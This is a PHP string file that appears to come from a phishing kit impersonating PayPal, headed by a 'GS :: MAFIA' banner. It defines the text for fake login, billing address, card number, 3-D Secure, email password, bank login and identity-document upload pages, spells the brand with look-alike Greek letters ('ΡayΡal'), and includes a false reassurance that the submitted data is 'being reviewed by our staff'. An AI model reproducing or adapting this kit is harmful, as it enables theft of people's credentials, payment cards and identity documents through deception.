<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
$gs_string1 = "Email";
$gs_string2 = "Next";
$gs_string3= "Having trouble logging in?";
$gs_string4 = "or";
$gs_string5 = "Sign Up";
$gs_string6 = "Contact Us";
$gs_string7 = "Privacy";
$gs_string8 = "Legal";
$gs_string9 = "Worldwide";
$gs_string10 = "Change";
$gs_string11 = "Log In";
$gs_string12 = "Your security is our top priority";
$gs_string13 = "Update your billing address";
$gs_string14 = "First Name";
$gs_string15 = "Last Name";
$gs_string16 = "Street address";
$gs_string17 = "City";
$gs_string18 = "ZIP";
$gs_string19 = "Continue";
$gs_string20 = "Feedback";
$gs_string21 = "Update Card Information";
$gs_string22 = "Cardholder Name";
$gs_string23 = "Month";
$gs_string24 = "Year";
$gs_string25 = "3-D Secure Verification";
$gs_string26 = "Update your E-mail Access";
$gs_string27 = "E-mail Address";
$gs_string28 = "E-mail Address Password";
$gs_string29 = "Attach a copy of your identity card";
$gs_string30 = "Attach a picture of your card (back/front side)";
$gs_string31 = "Finish";
$gs_string32 = "Password";
$gs_string33 = "Card informations";
$gs_string34 = "Card number";
$gs_string35 = "Country";
$gs_string36 = "Congratulations";
$gs_string37 = "<center>Your submitted account information are being reviewed by our staff.<br><br>In meantime, you can access your account with a reinforced security.<br><br><b>Thank you for choosing ΡayΡal.</b><br><br><center><br><b>You will be redirected to login to your account ΡayΡal... </b><br><br>";
$gs_string38 = "Account Verfication - Security Center";
$gs_string39 = "Log in to your PayPal account";
$gs_string40 = "Account Verification - Security Center";
$gs_stringbk26 = "Update your Bank Login";
$gs_stringbk27 = "Login Userame";
$gs_stringbk28 = "Login Password";
$gs_stringbk29 = "Bank Name";
$gs_idsub = "Please confirm your identity";
$gs_idsub2 = "Photo of your ID document (both sides for driver license or ID card) next to front side of your payment card.";
?>
